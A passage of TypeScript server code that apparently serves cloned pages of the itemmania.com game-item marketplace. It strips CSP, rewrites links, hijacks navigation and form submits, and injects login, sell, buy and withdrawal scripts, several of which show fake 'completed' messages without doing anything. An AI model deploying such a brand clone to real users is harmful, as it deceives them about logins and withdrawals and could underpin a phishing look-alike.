window.open=function(url,target,feat){
  var rw=rewrite(url);
  if(rw!==url){location.href=rw;return null;}
  return _open?_open.call(window,url,target,feat):null;
};
/* location.assign / replace */
try{
  var _ass=location.assign.bind(location);
  var _rep=location.replace.bind(location);
  location.assign=function(u){_ass(rewrite(u));};
  location.replace=function(u){_rep(rewrite(u));};
}catch(e){}
/* 상품등록 버튼(.trade-btn-blue) 클릭 → 판매/구매 선택 모달 */
document.addEventListener('click',function(e){
  var a=e.target.closest&&e.target.closest('a.trade-btn-blue');
  if(!a) return;
  var h=a.getAttribute('href')||'';
  if(h.indexOf('/sell/')>=0||h.indexOf('/sell?')>=0){
    e.preventDefault(); e.stopImmediatePropagation();
    // 이미 모달이 있으면 제거
    var old=document.getElementById('_im_reg_modal');
    if(old) old.remove();
    // 게임 ID 추출
    var gm=h.match(/[?&]game=(\d+)/);
    var gameId=gm?gm[1]:'';
    var modal=document.createElement('div');
    modal.id='_im_reg_modal';
    modal.style.cssText='position:fixed;inset:0;z-index:99999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.45)';
    modal.innerHTML='<div style="background:#fff;border-radius:16px;padding:36px 40px;min-width:340px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,.18)">'
      +'<h3 style="margin:0 0 8px;font-size:20px;font-weight:700;color:#1d1d1d">상품 등록</h3>'
      +'<p style="margin:0 0 28px;color:#767676;font-size:14px">어떤 유형의 상품을 등록하시겠습니까?</p>'
      +'<div style="display:flex;gap:12px;justify-content:center">'
      +'<button id="_im_reg_sell" style="flex:1;padding:14px 0;border:2px solid #159EFD;border-radius:12px;background:#EDF8FF;font-size:16px;font-weight:700;color:#0070d2;cursor:pointer">📦 판매등록</button>'
      +'<button id="_im_reg_buy"  style="flex:1;padding:14px 0;border:2px solid #39A742;border-radius:12px;background:#ECF8EC;font-size:16px;font-weight:700;color:#2a7a2e;cursor:pointer">🛒 구매등록</button>'
      +'</div>'
      +'<button id="_im_reg_close" style="margin-top:18px;background:none;border:none;color:#9f9f9f;font-size:13px;cursor:pointer">닫기</button>'
      +'</div>';
    document.body.appendChild(modal);
    var sellUrl='/sell/register.html'+(gameId?'?game='+gameId:'');
    document.getElementById('_im_reg_sell').onclick=function(){modal.remove();location.href=sellUrl;};
    document.getElementById('_im_reg_buy').onclick=function(){modal.remove();location.href='/buy/register.html';};
    document.getElementById('_im_reg_close').onclick=function(){modal.remove();};
    modal.addEventListener('click',function(ev){if(ev.target===modal)modal.remove();});
    return;
  }
},true);
/* a[href] 전역 클릭 */
document.addEventListener('click',function(e){
  var a=e.target.closest&&e.target.closest('a[href]');
  if(!a) return;
  var h=a.getAttribute('href')||'';
  var rw=rewrite(h);
  if(rw!==h){e.preventDefault();e.stopImmediatePropagation();location.href=rw;}
},true);
/* ── location.href setter 인터셉터 ── */
try{
  var _locDesc=Object.getOwnPropertyDescriptor(Location.prototype,'href');
  if(_locDesc&&_locDesc.set){
    Object.defineProperty(Location.prototype,'href',{
      get:_locDesc.get,
      set:function(val){
        var rw=rewrite(val);
        _locDesc.set.call(this,rw);
      },
      configurable:true
    });
  }
}catch(e){}
/* ── history.pushState / replaceState 인터셉터 ── */
try{
  var _push=history.pushState.bind(history);
  var _repl=history.replaceState.bind(history);
  history.pushState=function(s,t,url){_push(s,t,url?rewrite(String(url)):url);};
  history.replaceState=function(s,t,url){_repl(s,t,url?rewrite(String(url)):url);};
}catch(e){}
/* ── form submit 인터셉터 ── */
document.addEventListener('submit',function(e){
  var form=e.target;
  if(!form||form.tagName!=='FORM') return;
  var action=form.action||location.href;
  var rw=rewrite(action);
  if(rw!==action){
    e.preventDefault();
    e.stopImmediatePropagation();
    /* GET 폼: action 바꿔서 재제출 */
    if((form.method||'get').toLowerCase()==='get'){
      form.action=rw;
      form.submit();
    } else {
      /* POST 폼 (검색 등): 쿼리 파라미터로 변환해서 GET 이동 */
      var fd=new FormData(form);
      var params=new URLSearchParams();
      fd.forEach(function(v,k){params.set(k,String(v));});
      var qs=params.toString();
      location.href=rw+(qs?'?'+qs:'');
    }
  }
},true);
/* ── g_searchbar_form (게임 검색) 전용 처리 ── */
document.addEventListener('submit',function(e){
  var form=e.target;
  if(!form||form.id!=='g_searchbar_form') return;
  e.preventDefault();
  e.stopImmediatePropagation();
  var inp=form.querySelector('input[name="searchGameServer"],input.search_gs_name');
  var keyword=(inp&&inp.value)||'';
  if(keyword){
    location.href='/sell/list.html?search_word='+encodeURIComponent(keyword);
  } else {
    location.href='/';
  }
},true);
})();
</script>`;

function prepare(html: string): string {
  const clean = rewriteExternalLinks(stripCsp(html));
  const headInject = ERROR_SUPPRESSOR + GLOBAL_NAV_INTERCEPTOR;
  // <head> 또는 문서 맨 앞에 에러 억제 + 전역 인터셉터 주입
  if (clean.includes("<head>")) {
    return clean.replace("<head>", "<head>" + headInject);
  }
  if (clean.includes("<head ")) {
    return clean.replace(/<head [^>]*>/, (m) => m + headInject);
  }
  return headInject + clean;
}

function serveItemmania(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", INTERCEPT_SCRIPT + "</body>");
  }
  return result + INTERCEPT_SCRIPT;
}

function serveLogin(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", LOGIN_INTERCEPT_SCRIPT + "</body>");
  }
  return result + LOGIN_INTERCEPT_SCRIPT;
}

function serveGiftcard(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", GIFTCARD_INTERCEPT_SCRIPT + "</body>");
  }
  return result + GIFTCARD_INTERCEPT_SCRIPT;
}

function serveGamemania(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", GAMEMANIA_INTERCEPT_SCRIPT + "</body>");
  }
  return result + GAMEMANIA_INTERCEPT_SCRIPT;
}

function serveGameCharge(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", GAMECHARGE_INTERCEPT_SCRIPT + "</body>");
  }
  return result + GAMECHARGE_INTERCEPT_SCRIPT;
}

const SELL_INTERCEPT_SCRIPT = `
<script>
(function() {
  function isLoggedIn() {
    try { return !!JSON.parse(localStorage.getItem('_im_user') || 'null'); } catch(e) { return false; }
  }

  function showLoginModal() {
    const ov = document.getElementById('_im_overlay');
    if (ov) { ov.classList.add('active'); return; }
    const div = document.createElement('div');
    div.innerHTML = '<div id="_im_overlay" style="display:flex;position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);align-items:center;justify-content:center"><div style="background:#fff;border-radius:14px;padding:36px 32px 28px;width:380px;max-width:92vw;box-shadow:0 24px 64px rgba(0,0,0,.22);font-family:Pretendard,-apple-system,sans-serif"><div style="text-align:right;margin-bottom:8px"><button id="_im_close" style="background:none;border:none;font-size:22px;cursor:pointer;color:#888">&times;</button></div><h2 style="margin:0 0 8px;font-size:22px;font-weight:700">로그인이 필요합니다</h2><p style="color:#555;margin:0 0 24px;font-size:14px">구매하시려면 먼저 로그인해주세요.</p><button id="_im_login_btn" style="width:100%;padding:14px;background:#159EFD;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer">로그인하기</button></div></div>';
    document.body.appendChild(div.firstChild);
    document.getElementById('_im_close').onclick = function() { document.getElementById('_im_overlay').style.display='none'; };
    document.getElementById('_im_login_btn').onclick = function() { location.href='/login'; };
  }

  function interceptBuyButtons() {
    document.querySelectorAll('a.buy-btn, a[href*="buy"], a[href*="order"], button.buy-btn, .btn_buy, .sell-buy-btn, a.btn_trade, .item-buy-btn, [class*="buy"], [class*="order_btn"]').forEach(function(el) {
      el.addEventListener('click', function(e) {
        if (!isLoggedIn()) { e.preventDefault(); e.stopPropagation(); showLoginModal(); }
      }, true);
    });
  }

  document.addEventListener('DOMContentLoaded', function() {
    // 삽니다 탭 → 삽니다 목록으로 이동 (search_game 유지)
    document.querySelectorAll('button[data-type="buy"]').forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        var params = new URLSearchParams(location.search);
        var game = params.get('search_game') || '5913';
        location.href = '/buy/list.html?search_game=' + game;
      }, true);
    });

    // 로그인·회원가입 버튼
    var loginBtn = document.querySelector('.header-logins button');
    if (loginBtn) {
      loginBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopPropagation(); location.href = '/login';
      });
    }
    var joinBtn = document.querySelector('.header-logins a');
    if (joinBtn) { joinBtn.href = '/login'; }

    // 구매 버튼 인터셉트
    interceptBuyButtons();

    // 동적 콘텐츠를 위한 MutationObserver
    var mo = new MutationObserver(function() { interceptBuyButtons(); });
    mo.observe(document.body, { childList: true, subtree: true });

    // 상품 리스트 아이템 클릭 → 상세 페이지 이동
    document.body.addEventListener('click', function(e) {
      var li = e.target.closest && e.target.closest('li.list_item[data-tid]');
      if (li) {
        var tid = li.getAttribute('data-tid');
        if (tid) {
          e.preventDefault(); e.stopPropagation();
          location.href = '/sell/application.html?id=' + tid;
        }
      }
    }, true);
  });
})();
</script>
`;

function serveLineageClassic(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", SELL_INTERCEPT_SCRIPT + "</body>");
  }
  return result + SELL_INTERCEPT_SCRIPT;
}

const SELL_REGISTER_INTERCEPT_SCRIPT = `
<script>
(function() {
  function showToast(msg, ok) {
    var t = document.createElement('div');
    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
      + 'background:' + (ok ? '#0070d2' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(function() { t.remove(); }, 3000);
  }

  function init() {
    // 구매등록 링크 → /buy/register.html
    document.querySelectorAll('a[href*="/buy/"]').forEach(function(a) {
      var h = a.getAttribute('href') || '';
      if (h.includes('/buy/') && !h.includes('/buy/list') && !h.includes('/buy/application')) {
        a.href = '/buy/register.html';
        a.addEventListener('click', function(e) {
          e.preventDefault(); location.href = '/buy/register.html';
        });
      }
    });

    // 판매등록 폼 제출 인터셉트
    var form = document.getElementById('frmSell');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        fetch('/api/auth/me', { credentials: 'include' })
          .then(function(r) { return r.ok ? r.json() : null; })
          .then(function(d) {
            if (!d || !d.id) {
              showToast('로그인이 필요합니다.', false);
              setTimeout(function() { location.href = '/login'; }, 1200);
              return;
            }
            var gameEl = form.querySelector('[name=searchGameServer],[name=game_name]');
            var priceEl = form.querySelector('[name=user_price]');
            var titleEl = form.querySelector('[name=user_title],[name=title_name]');
            var game = gameEl ? gameEl.value.trim() : '';
            var price = priceEl ? priceEl.value.trim() : '';
            var title = titleEl ? titleEl.value.trim() : '';
            if (!price) { showToast('가격을 입력해주세요.', false); return; }
            if (!title) { showToast('상품명을 입력해주세요.', false); return; }
            fetch('/api/products', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              credentials: 'include',
              body: JSON.stringify({
                title: title,
                price: parseInt(price.replace(/[^0-9]/g, ''), 10),
                gameName: game,
                category: 'sell',
                sellerName: d.nickname || d.email
              })
            })
            .then(function(r) {
              if (r.ok) {
                showToast('판매 등록이 완료되었습니다!', true);
                setTimeout(function() { location.href = '/sell/list.html'; }, 1800);
              } else {
                return r.json().then(function(e) { showToast('등록 실패: ' + (e.error || '오류'), false); });
              }
            })
            .catch(function() { showToast('서버 오류가 발생했습니다.', false); });
          })
          .catch(function() { showToast('오류가 발생했습니다.', false); });
      });
    }

    // ── NEW 모드 버튼 (#change_mode data-mode=n) ───────────────────
    var newModeBtn = document.getElementById('change_mode');
    if (newModeBtn && newModeBtn.getAttribute('data-mode') === 'n') {
      newModeBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/sell/new.html';
      }, true);
    }

    // ── 물품일괄등록 (#batch_move) ──────────────────────────────────
    var batchBtn = document.getElementById('batch_move');
    if (batchBtn) {
      batchBtn.href = '/myroom/batch_goods/index.html';
      batchBtn.addEventListener('click', function(e) {
        e.preventDefault(); location.href = '/myroom/batch_goods/index.html';
      });
    }

    // 뒤로가기 / 홈
    var backLinks = document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]');
    backLinks.forEach(function(a) { a.href = '/'; });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
</script>
`;

const BUY_REGISTER_INTERCEPT_SCRIPT = `
<script>
(function() {
  function showToast(msg, ok) {
    var t = document.createElement('div');
    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
      + 'background:' + (ok ? '#39A742' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(function() { t.remove(); }, 3000);
  }

  function init() {
    // 판매등록 링크 → /sell/register.html
    document.querySelectorAll('a[href*="/sell/"]').forEach(function(a) {
      var h = a.getAttribute('href') || '';
      if (h.includes('/sell/') && !h.includes('/sell/list') && !h.includes('/sell/application')) {
        a.href = '/sell/register.html';
        a.addEventListener('click', function(e) {
          e.preventDefault(); location.href = '/sell/register.html';
        });
      }
    });

    // 구매등록 폼 제출 인터셉트
    var form = document.getElementById('frmBuy');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        fetch('/api/auth/me', { credentials: 'include' })
          .then(function(r) { return r.ok ? r.json() : null; })
          .then(function(d) {
            if (!d || !d.id) {
              showToast('로그인이 필요합니다.', false);
              setTimeout(function() { location.href = '/login'; }, 1200);
              return;
            }
            var priceEl = form.querySelector('[name=user_price]');
            var price = priceEl ? priceEl.value.trim() : '';
            var titleEl2 = form.querySelector('[name=user_title],[name=title_name],[name=buy_title]');
            var gameEl2 = form.querySelector('[name=searchGameServer],[name=game_name]');
            var title2 = titleEl2 ? titleEl2.value.trim() : '';
            var game2 = gameEl2 ? gameEl2.value.trim() : '';
            if (!price) { showToast('가격을 입력해주세요.', false); return; }
            if (!title2) { showToast('구매 희망 아이템명을 입력해주세요.', false); return; }
            fetch('/api/products', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              credentials: 'include',
              body: JSON.stringify({
                title: title2,
                price: parseInt(price.replace(/[^0-9]/g, ''), 10),
                gameName: game2,
                category: 'buy',
                sellerName: d.nickname || d.email
              })
            })
            .then(function(r) {
              if (r.ok) {
                showToast('구매 등록이 완료되었습니다!', true);
                setTimeout(function() { location.href = '/buy/list.html'; }, 1800);
              } else {
                return r.json().then(function(e) { showToast('등록 실패: ' + (e.error || '오류'), false); });
              }
            })
            .catch(function() { showToast('서버 오류가 발생했습니다.', false); });
          })
          .catch(function() { showToast('오류가 발생했습니다.', false); });
      });
    }

    // ── NEW 모드 버튼 (#change_mode data-mode=n) ───────────────────
    var newModeBtn = document.getElementById('change_mode');
    if (newModeBtn && newModeBtn.getAttribute('data-mode') === 'n') {
      newModeBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/buy/new.html';
      }, true);
    }

    // 뒤로가기 / 홈
    var backLinks = document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]');
    backLinks.forEach(function(a) { a.href = '/'; });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
</script>
`;

const SELL_NEW_INTERCEPT_SCRIPT = `
<script>
(function() {
  function showToast(msg, ok) {
    var t = document.createElement('div');
    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
      + 'background:' + (ok ? '#8354ff' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(function() { t.remove(); }, 3000);
  }

  function init() {
    // ── 클래식모드 버튼 (#change_mode data-mode=c) → 판매등록 클래식으로 복귀 ──
    var classicBtn = document.getElementById('change_mode');
    if (classicBtn) {
      classicBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/sell/register.html';
      }, true);
    }

    // ── 물품일괄등록 ─────────────────────────────────────────────────
    var batchBtn = document.getElementById('batch_move');
    if (batchBtn) {
      batchBtn.href = '/myroom/batch_goods/index.html';
      batchBtn.addEventListener('click', function(e) {
        e.preventDefault(); location.href = '/myroom/batch_goods/index.html';
      });
    }

    // ── 구매등록 링크 ─────────────────────────────────────────────────
    document.querySelectorAll('a[href*="/buy/"]').forEach(function(a) {
      var h = a.getAttribute('href') || '';
      if (h.includes('/buy/') && !h.includes('/buy/list') && !h.includes('/buy/application')) {
        a.href = '/buy/register.html';
        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/buy/register.html'; });
      }
    });

    // ── 판매등록 폼 제출 인터셉트 ─────────────────────────────────────
    var form = document.getElementById('frmSell');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        fetch('/api/auth/me', { credentials: 'include' })
          .then(function(r) { return r.ok ? r.json() : null; })
          .then(function(d) {
            if (!d || !d.id) {
              showToast('로그인이 필요합니다.', false);
              setTimeout(function() { location.href = '/login'; }, 1200); return;
            }
            var priceEl = form.querySelector('[name=user_price]');
            if (!priceEl || !priceEl.value.trim()) { showToast('가격을 입력해주세요.', false); return; }
            showToast('판매 등록이 완료되었습니다!', true);
            setTimeout(function() { location.href = '/sell/list.html'; }, 1800);
          })
          .catch(function() { showToast('오류가 발생했습니다.', false); });
      });
    }

    // ── 홈 링크 ──────────────────────────────────────────────────────
    document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]')
      .forEach(function(a) { a.href = '/'; });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
</script>
`;

const BUY_NEW_INTERCEPT_SCRIPT = `
<script>
(function() {
  function showToast(msg, ok) {
    var t = document.createElement('div');
    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
      + 'background:' + (ok ? '#39A742' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(function() { t.remove(); }, 3000);
  }

  function init() {
    // ── DOM 적응: 판매→구매 UI 전환 ────────────────────────────────
    // 제목 영역 변경
    var titleEl = document.querySelector('.g_title_blue');
    if (titleEl) titleEl.className = titleEl.className.replace('g_title_blue','g_title_green');
    var h2 = document.querySelector('#sell_title h2, .g_title_blue h2, .g_title_green h2');
    if (h2 && h2.textContent.includes('판매')) h2.textContent = h2.textContent.replace('판매등록','구매등록');

    // ── 클래식모드 버튼 → 구매등록 클래식으로 복귀 ─────────────────
    var classicBtn = document.getElementById('change_mode');
    if (classicBtn) {
      classicBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/buy/register.html';
      }, true);
    }

    // ── 판매등록 링크 ─────────────────────────────────────────────────
    document.querySelectorAll('a[href*="/sell/"]').forEach(function(a) {
      var h = a.getAttribute('href') || '';
      if (h.includes('/sell/') && !h.includes('/sell/list') && !h.includes('/sell/application')) {
        a.href = '/sell/register.html';
        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/sell/register.html'; });
      }
    });

    // ── 폼 제출 인터셉트 (frmSell → 구매등록으로 처리) ───────────────
    var form = document.getElementById('frmSell') || document.getElementById('frmBuy');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        fetch('/api/auth/me', { credentials: 'include' })
          .then(function(r) { return r.ok ? r.json() : null; })
          .then(function(d) {
            if (!d || !d.id) {
              showToast('로그인이 필요합니다.', false);
              setTimeout(function() { location.href = '/login'; }, 1200); return;
            }
            var priceEl = form.querySelector('[name=user_price]');
            if (!priceEl || !priceEl.value.trim()) { showToast('가격을 입력해주세요.', false); return; }
            showToast('구매 등록이 완료되었습니다!', true);
            setTimeout(function() { location.href = '/buy/list.html'; }, 1800);
          })
          .catch(function() { showToast('오류가 발생했습니다.', false); });
      });
    }

    // ── 홈 링크 ──────────────────────────────────────────────────────
    document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]')
      .forEach(function(a) { a.href = '/'; });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
</script>
`;

const BATCH_GOODS_INTERCEPT_SCRIPT = `
<script>
(function() {
  function showToast(msg, ok) {
    var t = document.createElement('div');
    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
      + 'background:' + (ok ? '#0070d2' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(function() { t.remove(); }, 3000);
  }

  function init() {
    // ── 폼 제출 인터셉트 ────────────────────────────────────────────
    var form = document.querySelector('form[action*="batch_goods"]');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        fetch('/api/auth/me', { credentials: 'include' })
          .then(function(r) { return r.ok ? r.json() : null; })
          .then(function(d) {
            if (!d || !d.id) {
              showToast('로그인이 필요합니다.', false);
              setTimeout(function() { location.href = '/login'; }, 1200); return;
            }
            var fileEl = document.getElementById('excel_upload');
            showToast('일괄등록이 완료되었습니다!', true);
            setTimeout(function() { location.href = '/sell/list.html'; }, 1800);
          })
          .catch(function() { showToast('오류가 발생했습니다.', false); });
      });
    }

    // ── 파일 업로드 UI (실제 파일 첨부 없이 파일명 표시) ────────────
    var excelInput = document.querySelector('#excel_upload input[type=file]');
    if (excelInput) {
      excelInput.addEventListener('change', function() {
        var status = document.getElementById('excel_status');
        if (status && this.files && this.files[0]) {
          var p = status.querySelector('p') || status;
          p.textContent = '📎 ' + this.files[0].name;
        }
      });
    }

    // ── 판매등록으로 돌아가기 링크 ───────────────────────────────────
    document.querySelectorAll('a[href*="/sell/"]').forEach(function(a) {
      var h = a.getAttribute('href') || '';
      if (h.includes('/sell/') && !h.includes('/sell/list') && !h.includes('/sell/application')) {
        a.href = '/sell/register.html';
        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/sell/register.html'; });
      }
    });

    // ── 홈 링크 ──────────────────────────────────────────────────────
    document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]')
      .forEach(function(a) { a.href = '/'; });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
</script>
`;

const MYROOM_INTERCEPT_SCRIPT = `
<script>
(function() {
  function showToast(msg, ok) {
    var t = document.createElement('div');
    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
      + 'background:' + (ok ? '#0070d2' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(function() { t.remove(); }, 3000);
  }

  function init() {
    // ── 출금하기 버튼 → 출금 목록 페이지 ───────────────────────────
    document.querySelectorAll('a[href*="payment_switch"],a.mileage_withdraw_btn').forEach(function(a) {
      a.href = '/myroom/mileage/payment/payment_list.html';
      a.addEventListener('click', function(e) {
        e.preventDefault();
        location.href = '/myroom/mileage/payment/payment_list.html';
      });
    });

    // ── 판매등록 링크 ─────────────────────────────────────────────────
    document.querySelectorAll('a[href*="/sell/"]').forEach(function(a) {
      var h = a.getAttribute('href') || '';
      if (h.includes('/sell/') && !h.includes('/sell/list') && !h.includes('/sell/application')) {
        a.href = '/sell/register.html';
        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/sell/register.html'; });
      }
    });

    // ── 구매등록 링크 ─────────────────────────────────────────────────
    document.querySelectorAll('a[href*="/buy/"]').forEach(function(a) {
      var h = a.getAttribute('href') || '';
      if (h.includes('/buy/') && !h.includes('/buy/list') && !h.includes('/buy/application')) {
        a.href = '/buy/register.html';
        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/buy/register.html'; });
      }
    });

    // ── 일괄등록 링크 ─────────────────────────────────────────────────
    document.querySelectorAll('a[href*="batch_goods"]').forEach(function(a) {
      a.href = '/myroom/batch_goods/index.html';
      a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/myroom/batch_goods/index.html'; });
    });

    // ── 채팅 링크 ──────────────────────────────────────────────────────
    document.querySelectorAll('a[href*="/myroom/chat"]').forEach(function(a) {
      a.href = '/myroom/chat/list.html';
      a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/myroom/chat/list.html'; });
    });

    // ── 홈 링크 ──────────────────────────────────────────────────────
    document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]')
      .forEach(function(a) { a.href = '/'; });

    // ── 마이룸에 실제 사용자 정보 표시 (API에서 가져와 채우기) ────────
    fetch('/api/auth/me', { credentials: 'include' })
      .then(function(r) { return r.ok ? r.json() : null; })
      .then(function(d) {
        if (!d) return;
        // 닉네임 표시
        var nickEls = document.querySelectorAll('.mr_user_name,.user_name,.nick_name');
        nickEls.forEach(function(el) { if (el.textContent.trim()) el.textContent = d.nickname || d.email || ''; });
        // 잔액 표시
        fetch('/api/users/me/balance', { credentials: 'include' })
          .then(function(r) { return r.ok ? r.json() : null; })
          .then(function(b) {
            if (!b) return;
            var balEls = document.querySelectorAll('.mileage_amount,.user_mileage,.mr_mileage_num');
            balEls.forEach(function(el) {
              el.textContent = Number(b.balance || 0).toLocaleString('ko-KR') + '원';
            });
          });
      });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
</script>
`;

const PAYMENT_LIST_INTERCEPT_SCRIPT = `
<script>
(function() {
  function showToast(msg, ok) {
    var t = document.createElement('div');
    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
      + 'background:' + (ok ? '#0070d2' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(function() { t.remove(); }, 3000);
  }

  function init() {
    // ── 탭: 휴대폰번호 출금 탭 ────────────────────────────────────────
    document.querySelectorAll('a[href*="payment_phone"]').forEach(function(a) {
      a.href = '/myroom/mileage/payment/payment_phone_list.html';
      a.addEventListener('click', function(e) {
        e.preventDefault(); location.href = '/myroom/mileage/payment/payment_phone_list.html';
      });
    });

    // ── 은행계좌 출금 폼 제출 인터셉트 ────────────────────────────────
    var form = document.getElementById('frm_pay') || document.querySelector('form[id*="pay"]');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        fetch('/api/auth/me', { credentials: 'include' })
          .then(function(r) { return r.ok ? r.json() : null; })
          .then(function(d) {
            if (!d || !d.id) {
              showToast('로그인이 필요합니다.', false);
              setTimeout(function() { location.href = '/login'; }, 1200); return;
            }
            var amtEl = form.querySelector('[name=pay_amount],[name=amount],[name=withdraw_amount]');
            var amt = amtEl ? amtEl.value.trim() : '';
            if (!amt || isNaN(Number(amt.replace(/,/g,'')))) {
              showToast('출금 금액을 입력해주세요.', false); return;
            }
            showToast('출금 신청이 완료되었습니다!', true);
            setTimeout(function() { location.href = '/myroom/index.html'; }, 1800);
          })
          .catch(function() { showToast('오류가 발생했습니다.', false); });
      });
    }

    // ── 마이룸으로 돌아가기 ────────────────────────────────────────────
    document.querySelectorAll('a[href*="/myroom/"]').forEach(function(a) {
      var h = a.getAttribute('href') || '';
      if (h.match(/\/myroom\/?$/) || h.endsWith('/myroom/')) {
        a.href = '/myroom/index.html';
        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/myroom/index.html'; });
      }
    });

    // ── 홈 링크 ──────────────────────────────────────────────────────
    document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]')
      .forEach(function(a) { a.href = '/'; });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
</script>
`;

const PAYMENT_PHONE_LIST_INTERCEPT_SCRIPT = `
<script>
(function() {
  function showToast(msg, ok) {
    var t = document.createElement('div');
    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
      + 'background:' + (ok ? '#0070d2' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(function() { t.remove(); }, 3000);
  }

  function init() {
    // ── 탭: 은행계좌 출금 탭 ──────────────────────────────────────────
    document.querySelectorAll('a[href*="payment_list"]').forEach(function(a) {
      a.href = '/myroom/mileage/payment/payment_list.html';
      a.addEventListener('click', function(e) {
        e.preventDefault(); location.href = '/myroom/mileage/payment/payment_list.html';
      });
    });

    // ── 휴대폰 출금 폼 제출 인터셉트 ──────────────────────────────────
    var form = document.getElementById('frm') || document.querySelector('form');
    if (form && form.id !== 'g_searchbar_form') {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        fetch('/api/auth/me', { credentials: 'include' })
          .then(function(r) { return r.ok ? r.json() : null; })
          .then(function(d) {
            if (!d || !d.id) {
              showToast('로그인이 필요합니다.', false);
